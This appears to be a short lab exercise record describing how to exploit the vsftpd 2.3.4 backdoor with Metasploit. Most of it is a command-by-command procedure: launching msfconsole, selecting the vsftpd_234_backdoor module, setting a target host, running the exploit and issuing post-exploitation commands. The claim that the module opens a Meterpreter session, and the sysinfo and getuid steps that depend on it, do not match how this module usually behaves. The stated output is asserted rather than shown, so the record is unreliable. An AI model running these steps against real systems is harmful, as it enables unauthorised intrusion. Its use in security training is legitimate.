Aim
To exploit the vsftpd 2.3.4 backdoor vulnerability using Metasploit and establish a Meterpreter session.
Introduction
vsftpd 2.3.4 contains a backdoor vulnerability that allows remote command execution. Metasploit provides an
exploit module to target this vulnerability.
Procedure
Step 1: Open Metasploit Console
msfconsole
Step 2: Search Exploit
search vsftpd
Step 3: Select Exploit Module
use exploit/unix/ftp/vsftpd_234_backdoor
Step 4: Set Target Host
set RHOSTS 192.168.1.10
Step 5: Run Exploit
exploit
Step 6: Execute Commands
sysinfo
getuid
Output
Meterpreter session opened
System information displayed
Result
Thus, the vsftpd 2.3.4 vulnerability was exploited successfully using Metasploit
